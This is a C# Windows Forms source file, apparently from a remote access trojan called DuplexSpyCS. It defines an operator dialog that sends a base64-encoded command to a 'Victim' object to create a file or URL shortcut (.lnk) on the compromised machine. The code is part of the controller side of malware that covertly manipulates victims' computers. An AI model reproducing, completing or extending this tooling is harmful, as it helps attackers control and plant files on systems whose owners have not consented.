using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileShortCut : Form
    {
        private Victim v;
        private string m_szCurrentDir;
        private string m_szFilePath;

        public frmFileShortCut(Victim v, string szCurrentDir, string szFilePath)
        {
            InitializeComponent();

            this.v = v;
            m_szCurrentDir = szCurrentDir;
            m_szFilePath = szFilePath;
        }

        private void fnSetup()
        {
            radioButton2.Checked = true;
            if (!string.IsNullOrEmpty(m_szFilePath))
            {
                string szFileName = Path.GetFileName(m_szFilePath);

                textBox1.Text = m_szFilePath;
                textBox2.Text = $"{szFileName}.lnk";
            }
        }

        private void frmFileShortCut_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szType = string.Empty;
            if (radioButton2.Checked)
                szType = "file";
            else if (radioButton1.Checked)
                szType = "url";

            v.SendCommand($"file|sc|{szType}|{string.Join("|", new string[] {textBox1.Text, textBox2.Text, textBox3.Text}.Select(x => Crypto.b64E2Str(x)))}");
        }
    }
}
